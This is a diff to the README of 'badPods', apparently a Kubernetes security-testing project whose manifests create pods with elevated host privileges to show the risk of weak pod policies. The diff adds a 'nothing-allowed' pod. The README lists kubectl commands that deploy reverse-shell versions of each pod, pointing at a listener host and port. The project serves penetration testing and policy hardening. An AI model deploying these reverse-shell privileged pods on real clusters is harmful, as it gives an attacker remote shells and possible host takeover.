@@ -1,6 +1,6 @@
 # badPods
 
-A collection of yamls that create pods with different elevated privileges. Quickly demonstrate the impact of allowing specific security sensitive pod specifications. 
+A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing specific security sensitive pod specifications. 
 
 ## Background
 Occasionally pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications using Pod Security Policies or with admission controllers like OPA Gatekeeper. However, the real-world security implication of allowing a certain attributes is not always understood, and quite often, pod creation polices are not as locked down as they should be. 
@@ -51,6 +51,8 @@ kubectl apply -f ./yaml/hostpath/pod-hostpath.yaml
 kubectl apply -f ./yaml/hostpid/pod-hostpid.yaml 
 kubectl apply -f ./yaml/hostnetwork/pod-hostnetwork.yaml
 kubectl apply -f ./yaml/hostipc/pod-hostipc.yaml
+kubectl apply -f ./yaml/nothing-allowed/pod-nothing-allowed.yaml
+
 ```
 
 ### Reverse shell version of each pod
@@ -63,6 +65,7 @@ HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshe
 HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath/pod-hostpath-revshell.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
 HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml | kubectl apply -f -
 ```
 
 # Acknowledgements 
